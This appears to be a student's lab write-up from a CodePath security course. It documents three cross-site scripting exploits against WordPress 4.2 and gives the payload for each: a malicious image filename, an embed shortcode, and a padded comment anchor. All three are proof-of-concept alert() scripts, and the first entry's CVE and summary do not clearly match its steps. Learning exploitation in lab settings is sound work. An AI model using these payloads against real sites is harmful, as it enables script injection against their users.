# CodePath Week 7
Week 7 Word Press Exploits

Exploit 1: Cross-Site Scripting (XSS)

Summary:
CVE-2017-0961
Vulnerability type : XSS
Tested Version: 4.2
Fixed Version: 4.2.1
Uploading a large payload file that exceeds the limit results in an error.

Steps:
xss<img src=x onerror=alert(1)>.png
upload to new media on wpdistillery


Exploit 2: Authenticated XSS in youtube link

Summary:
Vulnerability Type: XSS
Test Version: 4.2
Fixed Version: 4.2.1

Steps:
Must be a registered user with acess to edit/create posts
In creating a post, upload the following script:
[embed src='https://youtube.com/embed/123\x3csvg onload=alert(1)\x3e'][/embed]
After clicking update, click view post- you will get the XSS alert
![Exploit2XSSyoutubeurl](https://github.com/neilhendricks/week7/blob/master/exploit2gif.gif?raw=true)


Exploit 3: Unauthenticated XSS in comment

Summary:

Vulnerability Type: XSS
Test Version: 4.2
Fixed Version: 4.2.1

Steps:
Comment on a post with the following script
<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute; left:0; top:0; width:5000px; height:5000px  <insert 64kb of random data>'></a>





